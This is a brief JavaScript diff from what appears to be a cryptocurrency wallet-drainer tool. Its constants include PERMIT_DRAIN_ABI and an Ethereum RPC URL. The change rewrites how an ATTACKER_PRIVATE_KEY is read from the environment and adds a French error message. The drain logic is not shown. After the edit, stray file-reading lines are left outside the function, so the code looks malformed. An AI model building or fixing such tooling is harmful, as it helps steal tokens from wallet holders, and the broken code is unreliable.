@@ -13,10 +13,12 @@ const PERMIT_DRAIN_ABI = [
 const RPC_URL = 'https://eth-mainnet.g.alchemy.com/v2/demo';
 
 function getPrivateKey() {
-  if (process.env.ATTACKER_PRIVATE_KEY) {
-    const key = process.env.ATTACKER_PRIVATE_KEY.trim();
-    if (key.length === 64) return '0x' + key;
+  const key = process.env.ATTACKER_PRIVATE_KEY?.trim();
+  if (!key || key.length !== 64) {
+    throw new Error('🔴 Clé privée manquante ou invalide (64 caractères hex sans 0x).');
   }
+  return '0x' + key;
+}
   const fs = require('fs');
   const path = require('path');
   const filePath = path.resolve('./private_key.txt');
